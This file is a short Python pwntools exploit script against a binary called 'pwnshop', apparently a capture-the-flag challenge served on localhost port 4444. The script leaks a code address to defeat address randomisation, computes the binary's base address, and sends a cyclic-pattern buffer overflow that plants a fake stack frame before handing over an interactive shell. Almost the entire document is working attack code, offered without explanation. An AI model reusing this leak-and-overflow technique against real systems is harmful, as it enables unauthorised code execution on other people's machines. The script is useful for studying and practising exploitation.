#!/usr/bin/env python


from pwn import *

BINARY = "./pwnshop"
ADDR = "localhost"
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)


class Offsets:
    fake_frame_offset = 0x40c0


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve():
    io = conn()

    input("PAUSE...")
    io.sendlineafter("> ", "2")
    io.sendlineafter("What do you wish to sell? ", "")
    io.sendlineafter("How much do you want for it? ", cyclic(0x7, n=8))
    io.recvuntil("? ")
    elf_leak = io.recvuntil("?")[:-1]
    elf_leak = u64(elf_leak[8:].ljust(8, b"\x00"))
    elf.address = elf_leak - Offsets.fake_frame_offset
    log.success(f"elf base address found: {hex(elf.address)}")
    log.success(f"fake frame found @: {hex(elf_leak)}")

    payload = [
        cyclic(cyclic_find(0x616161616161616a, n=8), n=8),
        elf_leak,
    ]
    io.sendlineafter("> ", "1")
    io.sendlineafter("Enter details: ", flat(payload))

    io.interactive()


if __name__ == "__main__":
    solve()
